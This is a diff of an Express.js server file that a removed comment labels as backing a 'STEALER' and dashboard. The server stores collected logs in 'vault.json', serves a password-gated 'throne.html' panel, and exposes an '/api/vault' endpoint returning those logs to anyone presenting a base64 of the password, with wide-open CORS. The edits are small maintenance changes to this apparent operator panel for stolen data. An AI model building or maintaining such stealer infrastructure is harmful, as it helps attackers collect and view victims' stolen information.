@@ -4,17 +4,12 @@ const fs = require('fs');
 const path = require('path');
 const app = express();
 
-app.use(cors({
-  origin: '*', // UNLOCKS ALL – STEALER + DASHBOARD SAFE
-  credentials: true,
-  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-  allowedHeaders: ['Content-Type']
-}));
+app.use(cors({ origin: '*' }));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
 
-const PASSWORD = "crackme1"; // CHANGE THIS
+const PASSWORD = "your-key-666"; // CHANGE THIS
 let logs = [];
 
 const dataFile = path.join(__dirname, 'vault.json');
@@ -48,7 +43,7 @@ app.post('/unlock', (req, res) => {
   if (req.body.pass === PASSWORD) {
     res.sendFile(path.join(__dirname, 'public/throne.html'));
   } else {
-    res.redirect('/gate?fail=true');
+    res.redirect('/gate?fail=1');
   }
 });
 
@@ -56,7 +51,7 @@ app.get('/api/vault', (req, res) => {
   if (req.query.key === btoa(PASSWORD)) {
     res.json(logs);
   } else {
-    res.status(403).json({ error: 'NO' });
+    res.status(403).send('NO');
   }
 });
 
@@ -65,9 +60,13 @@ app.get('/avatar/:id', (req, res) => {
   res.redirect(url || 'https://i.imgur.com/removed.png');
 });
 
-// CATCH-ALL FOR ROOT (REDIRECT TO GATE)
 app.get('/', (req, res) => {
   res.redirect('/gate');
+});
+
+// FIX 404 ON /unlock
+app.use((req, res) => {
+  res.status(404).sendFile(path.join(__dirname, 'public/gate.html'));
 });
 
 const port = process.env.PORT || 3000;
